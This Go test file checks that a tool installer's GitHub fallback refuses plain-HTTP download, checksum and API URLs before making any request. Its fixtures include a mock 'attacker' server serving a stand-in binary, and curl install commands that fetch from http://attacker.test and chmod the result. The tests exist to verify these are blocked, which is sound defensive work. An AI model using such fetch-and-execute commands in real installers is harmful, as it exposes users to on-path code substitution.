package app

import (
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/lkshrk/omni/internal/config"
	"github.com/lkshrk/omni/internal/executor"
)

const attackerPayload = "#!/bin/sh\necho attacker-controlled binary\n"

// Serves a distinguishable payload over plain http and counts every request it receives, so a neutralized guard fails loudly with the live payload instead of a bare "expected error".
func plainHTTPAttackerServer(t *testing.T) (*httptest.Server, *atomic.Int32) {
	t.Helper()
	var requests atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		requests.Add(1)
		w.Header().Set("Content-Type", "application/octet-stream")
		_, _ = w.Write([]byte(attackerPayload))
	}))
	t.Cleanup(srv.Close)
	return srv, &requests
}

func TestNativeGitHubInstallPipeline_RejectsPlainHTTPBeforeDialling(t *testing.T) {
	t.Parallel()
	attacker, requests := plainHTTPAttackerServer(t)

	dir := t.TempDir()
	a := &App{ConfigPath: filepath.Join(dir, "settings.json"), CacheDir: dir}
	a.SetGitHubFallbackAPIForTest(attacker.URL, attacker.Client())

	downloadURL := attacker.URL + "/asset/tool"
	fallback := &config.FallbackSpec{
		Binary: "tool",
		Recipe: config.FallbackRecipe{
			Type:             config.FallbackRecipeGitHubReleaseAsset,
			AssetName:        "tool",
			AssetDownloadURL: downloadURL,
		},
	}

	err := a.nativeGitHubInstallPipeline(t.Context(), "tool", fallback)
	binPath := filepath.Join(dir, "fallback", "bin", "tool")
	if n := requests.Load(); n != 0 {
		installed, _ := os.ReadFile(binPath)
		t.Fatalf("plain-http asset URL %s was dialled %d time(s); installed binary = %q", downloadURL, n, installed)
	}
	if err == nil {
		t.Fatal("nativeGitHubInstallPipeline accepted a plain-http asset_download_url")
	}
	if !errors.Is(err, errAssetDownloadURLScheme) {
		t.Errorf("error = %v, want it to wrap errAssetDownloadURLScheme", err)
	}
	if _, statErr := os.Stat(binPath); !os.IsNotExist(statErr) {
		installed, _ := os.ReadFile(binPath)
		t.Errorf("binary was installed from a plain-http URL: %q", installed)
	}
}

func TestRunFallbackInstall_PlainHTTPCurlNeverReachesShellOrNetwork(t *testing.T) {
	t.Parallel()
	attacker, requests := plainHTTPAttackerServer(t)
	downloadURL := attacker.URL + "/asset/tool"

	dir := t.TempDir()
	a := &App{ConfigPath: filepath.Join(dir, "settings.json"), CacheDir: dir}
	a.SetGitHubFallbackAPIForTest(attacker.URL, attacker.Client())
	mock := executor.NewMatchMock().WithFallback(executor.MockCall{})
	a.SetFallbackExecutor(mock)

	// The command a pre-guard omni would have minted and persisted for this recipe.
	storedInstall := `mkdir -p {{cache_dir}} {{bin_dir}} && ` +
		`asset={{cache_dir}}/` + shellSingleQuote("tool") + ` && ` +
		`curl -fsSL ` + shellSingleQuote(downloadURL) + ` -o "$asset" && ` +
		`cp "$asset" {{bin_dir}}/{{binary}} && chmod +x {{bin_dir}}/{{binary}}`
	fallback := &config.FallbackSpec{
		Binary: "tool",
		Recipe: config.FallbackRecipe{
			Type:             config.FallbackRecipeGitHubReleaseAsset,
			AssetName:        "tool",
			AssetDownloadURL: downloadURL,
		},
		Commands: config.FallbackCommands{Install: storedInstall},
	}

	err := a.runFallbackInstall(t.Context(), "tool", "install", config.ToolSpec{}, fallback, storedInstall)

	for _, call := range mock.Calls {
		joined := call.Name + " " + strings.Join(call.Args, " ")
		if strings.Contains(joined, downloadURL) {
			t.Fatalf("plain-http curl reached the shell: %q", joined)
		}
	}
	if n := mock.CallCount(); n != 0 {
		t.Errorf("shell executor invoked %d time(s) for a plain-http recipe", n)
	}
	if n := requests.Load(); n != 0 {
		installed, _ := os.ReadFile(filepath.Join(dir, "fallback", "bin", "tool"))
		t.Fatalf("plain-http asset URL %s was dialled %d time(s); installed binary = %q", downloadURL, n, installed)
	}
	if err == nil {
		t.Fatal("runFallbackInstall accepted a plain-http asset_download_url")
	}
	if !errors.Is(err, errAssetDownloadURLScheme) {
		t.Errorf("error = %v, want it to wrap errAssetDownloadURLScheme", err)
	}
}

func TestResolveGitHubFallback_NeverMintsPlainHTTPCurl(t *testing.T) {
	t.Parallel()
	attacker, requests := plainHTTPAttackerServer(t)

	osName := githubOSNames()[0]
	archName := githubArchNames()[0]
	assetName := fmt.Sprintf("tool_1.0_%s_%s.tar.gz", osName, archName)
	downloadURL := attacker.URL + "/" + assetName

	api := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = fmt.Fprintf(w, `{"id":1,"tag_name":"v1.0.0","published_at":"2026-07-20T00:00:00Z","assets":[{"id":2,"name":%q,"browser_download_url":%q}]}`, assetName, downloadURL)
	}))
	t.Cleanup(api.Close)

	a := &App{}
	a.SetGitHubFallbackAPIForTest(api.URL, api.Client())

	fallback, resolved, err := a.resolveGitHubFallback(t.Context(), "tool", "owner", "repo")
	if err == nil {
		t.Fatalf("resolveGitHubFallback minted a spec for a plain-http asset URL: install command = %q", fallback.Commands.Install)
	}
	if resolved {
		t.Error("resolveGitHubFallback resolved = true, want false for a plain-http asset URL")
	}
	for label, command := range map[string]string{
		"install": fallback.Commands.Install,
		"upgrade": fallback.Commands.Upgrade,
	} {
		if strings.Contains(command, downloadURL) {
			t.Errorf("%s command carries the plain-http URL: %q", label, command)
		}
	}
	if n := requests.Load(); n != 0 {
		t.Errorf("plain-http asset URL %s was dialled %d time(s) during resolve", downloadURL, n)
	}
}

func TestPreserveCustomGitHubFallbackCommands_RejectsPlainHTTPBaseline(t *testing.T) {
	t.Parallel()
	const plainHTTP = "http://attacker.test/tool.tar.gz"
	staleCurl := `curl -fsSL ` + shellSingleQuote(plainHTTP) + ` -o "$asset"`
	current := &config.FallbackSpec{
		Recipe:   config.FallbackRecipe{Type: config.FallbackRecipeGitHubReleaseAsset, AssetDownloadURL: plainHTTP},
		Commands: config.FallbackCommands{Install: staleCurl, Upgrade: staleCurl},
	}
	refreshed := &config.FallbackSpec{
		Recipe:   config.FallbackRecipe{Type: config.FallbackRecipeGitHubReleaseAsset, AssetDownloadURL: "https://example.test/tool.tar.gz"},
		Commands: config.FallbackCommands{Install: "generated https install", Upgrade: "generated https upgrade"},
	}

	err := preserveCustomGitHubFallbackCommands(current, refreshed)
	for label, command := range map[string]string{
		"install": refreshed.Commands.Install,
		"upgrade": refreshed.Commands.Upgrade,
	} {
		if strings.Contains(command, plainHTTP) {
			t.Errorf("stale plain-http %s command was copied onto the refreshed spec: %q", label, command)
		}
	}
	if err == nil {
		t.Fatal("preserveCustomGitHubFallbackCommands accepted a plain-http baseline URL")
	}
	if !errors.Is(err, errAssetDownloadURLScheme) {
		t.Errorf("error = %v, want it to wrap errAssetDownloadURLScheme", err)
	}
}

// Counts every request and answers with a usable digest, so a neutralized guard shows up as a successful plaintext checksum fetch rather than a bare "expected error".
func plainHTTPChecksumServer(t *testing.T, digest string) (*httptest.Server, *atomic.Int32) {
	t.Helper()
	var requests atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		requests.Add(1)
		_, _ = w.Write([]byte(digest + "  tool.tar.gz\n"))
	}))
	t.Cleanup(srv.Close)
	return srv, &requests
}

// The release JSON is attacker-influenced input and this is the first hop, so guardGitHubRedirect never sees it: without a scheme check the checksums asset is fetched in cleartext.
func TestFetchReleaseChecksum_NeverDialsAPlainHTTPChecksumAsset(t *testing.T) {
	t.Parallel()
	attackerDigest := strings.Repeat("a", sha256.Size*2)
	attacker, requests := plainHTTPChecksumServer(t, attackerDigest)

	api := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]any{
			"id": 1,
			"assets": []map[string]any{
				{"id": 2, "name": "checksums.txt", "browser_download_url": attacker.URL + "/checksums.txt"},
			},
		})
	}))
	t.Cleanup(api.Close)

	a := &App{}
	a.SetGitHubFallbackAPIForTest(api.URL, api.Client())

	got, err := a.fetchReleaseChecksum(t.Context(), "owner", "repo", "v1", "tool.tar.gz")
	if n := requests.Load(); n != 0 {
		t.Fatalf("plain-http checksums asset %s was dialled %d time(s); digest = %q", attacker.URL, n, got)
	}
	if err == nil {
		t.Fatalf("fetchReleaseChecksum accepted a plain-http checksums asset: digest = %q", got)
	}
	if !errors.Is(err, errChecksumURLScheme) {
		t.Errorf("error = %v, want it to wrap errChecksumURLScheme", err)
	}
	if got != "" {
		t.Errorf("digest = %q, want no digest from a rejected asset", got)
	}
}

// Per-asset rejection, not an abort: a release carrying both must still verify via the https one.
func TestFetchReleaseChecksum_SkipsPlainHTTPAssetAndUsesHTTPSSibling(t *testing.T) {
	t.Parallel()
	want := strings.Repeat("b", sha256.Size*2)
	attacker, requests := plainHTTPChecksumServer(t, strings.Repeat("a", sha256.Size*2))

	api := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/sibling" {
			_, _ = w.Write([]byte(want + "  tool.tar.gz\n"))
			return
		}
		_ = json.NewEncoder(w).Encode(map[string]any{
			"id": 1,
			"assets": []map[string]any{
				{"id": 2, "name": "first_checksums.txt", "browser_download_url": attacker.URL + "/checksums.txt"},
				{"id": 3, "name": "checksums.txt", "browser_download_url": "https://" + r.Host + "/sibling"},
			},
		})
	}))
	t.Cleanup(api.Close)

	a := &App{}
	a.SetGitHubFallbackAPIForTest(api.URL, api.Client())

	got, err := a.fetchReleaseChecksum(t.Context(), "owner", "repo", "v1", "tool.tar.gz")
	if err != nil {
		t.Fatalf("fetchReleaseChecksum: %v", err)
	}
	if got != want {
		t.Fatalf("digest = %q, want the https sibling's %q", got, want)
	}
	if n := requests.Load(); n != 0 {
		t.Fatalf("plain-http checksums asset was dialled %d time(s)", n)
	}
}

// OMNI_GITHUB_API_BASE designates a trust root; over plain http any on-path attacker inherits it and gets to name the asset the install pipeline downloads and chmod +x's.
func TestFetchLatestGitHubRelease_PlainHTTPEnvBaseIsNeverDialled(t *testing.T) {
	var requests atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		requests.Add(1)
		_, _ = fmt.Fprint(w, `{"id":1,"tag_name":"v1.0.0","published_at":"2026-07-20T00:00:00Z","assets":[]}`)
	}))
	t.Cleanup(srv.Close)
	t.Setenv("OMNI_GITHUB_API_BASE", srv.URL)

	release, err := (&App{}).fetchLatestGitHubRelease(t.Context(), "owner", "repo")
	if n := requests.Load(); n != 0 {
		t.Fatalf("plain-http api base %s was dialled %d time(s); tag = %q", srv.URL, n, release.TagName)
	}
	if err == nil {
		t.Fatalf("fetchLatestGitHubRelease accepted a plain-http OMNI_GITHUB_API_BASE: tag = %q", release.TagName)
	}
	if !errors.Is(err, errGitHubAPIBaseScheme) {
		t.Errorf("error = %v, want it to wrap errGitHubAPIBaseScheme", err)
	}
	// The rejection has to stay diagnosable from the message alone.
	if !strings.Contains(err.Error(), "/repos/owner/repo/releases/latest") {
		t.Errorf("error = %v, want it to name the refused URL", err)
	}
}

func TestFetchGitHubReleaseByTag_PlainHTTPEnvBaseIsNeverDialled(t *testing.T) {
	var requests atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		requests.Add(1)
		_, _ = fmt.Fprint(w, `{"id":1,"tag_name":"v1.0.0","assets":[]}`)
	}))
	t.Cleanup(srv.Close)
	t.Setenv("OMNI_GITHUB_API_BASE", srv.URL)

	_, err := (&App{}).fetchGitHubReleaseByTag(t.Context(), "owner", "repo", "v1.0.0")
	if n := requests.Load(); n != 0 {
		t.Fatalf("plain-http api base %s was dialled %d time(s)", srv.URL, n)
	}
	if !errors.Is(err, errGitHubAPIBaseScheme) {
		t.Fatalf("error = %v, want it to wrap errGitHubAPIBaseScheme", err)
	}
}

// Locks the api-base gate to the same semantics as the config validator, with no loopback carve-out.
func TestNewGitHubAPIRequest_MatchesConfigSchemeSemantics(t *testing.T) {
	t.Parallel()
	const suffix = "/repos/owner/repo/releases/latest"
	rejected := []string{
		"http://example.test",
		"HTTP://example.test",
		"ftp://example.test",
		"file:///tmp",
		"example.test",
		"//example.test",
		"https://",
		"http://127.0.0.1:8080",
		"http://localhost:8080",
	}
	for _, base := range rejected {
		a := &App{githubAPI: base}
		req, err := a.newGitHubAPIRequest(t.Context(), suffix)
		if err == nil {
			t.Errorf("newGitHubAPIRequest(%q) = %v, want rejection", base, req.URL)
			continue
		}
		if !errors.Is(err, errGitHubAPIBaseScheme) {
			t.Errorf("base %q: error = %v, want it to wrap errGitHubAPIBaseScheme", base, err)
		}
		if req != nil {
			t.Errorf("base %q: returned a request alongside its error: %v", base, req.URL)
		}
	}

	for _, base := range []string{"https://example.test", "HTTPS://example.test", defaultGitHubAPIBase} {
		a := &App{githubAPI: base}
		req, err := a.newGitHubAPIRequest(t.Context(), suffix)
		if err != nil {
			t.Errorf("newGitHubAPIRequest(%q): %v", base, err)
			continue
		}
		if req.URL.Scheme != "https" {
			t.Errorf("base %q: request scheme = %q, want https", base, req.URL.Scheme)
		}
		if req.URL.Path != suffix {
			t.Errorf("base %q: request path = %q, want %q", base, req.URL.Path, suffix)
		}
	}
}

// The env var must not become a way around the gate when no test seam is set.
func TestGitHubAPIBase_DefaultsToHTTPSWithoutAnOverride(t *testing.T) {
	t.Setenv("OMNI_GITHUB_API_BASE", "")
	if got := (&App{}).githubAPIBase(); got != defaultGitHubAPIBase {
		t.Fatalf("githubAPIBase() = %q, want %q", got, defaultGitHubAPIBase)
	}
	if !config.IsHTTPSURL(defaultGitHubAPIBase) {
		t.Fatalf("defaultGitHubAPIBase %q is not https", defaultGitHubAPIBase)
	}
}

// Locks the app-side guard to the same semantics as the config validator: uppercase HTTPS is fine, every other scheme and an empty host are not.
func TestGitHubReleaseAssetInstallCommand_MatchesConfigSchemeSemantics(t *testing.T) {
	t.Parallel()
	rejected := []string{
		"http://example.test/tool.tar.gz",
		"HTTP://example.test/tool.tar.gz",
		"ftp://example.test/tool.tar.gz",
		"file:///tmp/tool.tar.gz",
		"example.test/tool.tar.gz",
		"//example.test/tool.tar.gz",
		"https:///tool.tar.gz",
		"http://127.0.0.1:8080/tool.tar.gz",
		"http://localhost:8080/tool.tar.gz",
	}
	for _, raw := range rejected {
		if config.IsHTTPSURL(raw) {
			t.Errorf("config.IsHTTPSURL(%q) = true, want false", raw)
		}
		got, err := githubReleaseAssetInstallCommand(raw)
		if err == nil {
			t.Errorf("githubReleaseAssetInstallCommand(%q) = %q, want rejection", raw, got)
			continue
		}
		if got != "" {
			t.Errorf("githubReleaseAssetInstallCommand(%q) returned a command alongside its error: %q", raw, got)
		}
	}

	for _, raw := range []string{"https://example.test/tool.tar.gz", "HTTPS://example.test/tool.tar.gz"} {
		if !config.IsHTTPSURL(raw) {
			t.Errorf("config.IsHTTPSURL(%q) = false, want true", raw)
		}
		got, err := githubReleaseAssetInstallCommand(raw)
		if err != nil {
			t.Errorf("githubReleaseAssetInstallCommand(%q): %v", raw, err)
			continue
		}
		if !strings.Contains(got, "curl -fsSL --proto-redir =https "+shellSingleQuote(raw)) {
			t.Errorf("command for %q lacks the expected curl invocation: %q", raw, got)
		}
	}
}
